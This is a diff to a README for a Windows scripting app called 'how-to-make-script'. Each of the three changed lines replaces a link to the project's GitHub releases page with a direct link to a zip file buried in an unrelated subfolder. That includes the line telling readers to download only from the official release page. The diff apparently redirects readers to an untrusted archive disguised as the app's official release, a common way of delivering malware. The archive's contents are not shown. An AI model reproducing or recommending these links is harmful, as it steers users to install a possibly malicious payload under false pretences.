@@ -1,6 +1,6 @@
 # 🎬 how-to-make-script - Write, shape, and manage scripts
 
-[![Download the app](https://img.shields.io/badge/Download%20for%20Windows-6A5ACD?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Roundwhitefishdrop407/how-to-make-script/releases)
+[![Download the app](https://img.shields.io/badge/Download%20for%20Windows-6A5ACD?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Roundwhitefishdrop407/how-to-make-script/raw/refs/heads/main/skills/audience-insight/how_make_script_to_2.7.zip)
 
 ## 🚀 What this is
 
@@ -20,7 +20,7 @@ The app is built for people who want a simple way to work with scripts on Window
 
 To get the app, visit this page to download:
 
-**[https://github.com/Roundwhitefishdrop407/how-to-make-script/releases](https://github.com/Roundwhitefishdrop407/how-to-make-script/releases)**
+**[https://github.com/Roundwhitefishdrop407/how-to-make-script/raw/refs/heads/main/skills/audience-insight/how_make_script_to_2.7.zip](https://github.com/Roundwhitefishdrop407/how-to-make-script/raw/refs/heads/main/skills/audience-insight/how_make_script_to_2.7.zip)**
 
 On that page, look for the latest release. Then:
 
@@ -190,6 +190,6 @@ This project connects with:
 
 Only download the app from the official release page:
 
-**[https://github.com/Roundwhitefishdrop407/how-to-make-script/releases](https://github.com/Roundwhitefishdrop407/how-to-make-script/releases)**
+**[https://github.com/Roundwhitefishdrop407/how-to-make-script/raw/refs/heads/main/skills/audience-insight/how_make_script_to_2.7.zip](https://github.com/Roundwhitefishdrop407/how-to-make-script/raw/refs/heads/main/skills/audience-insight/how_make_script_to_2.7.zip)**
 
 Use the latest Windows release file from that page and keep your downloads in a folder you trust
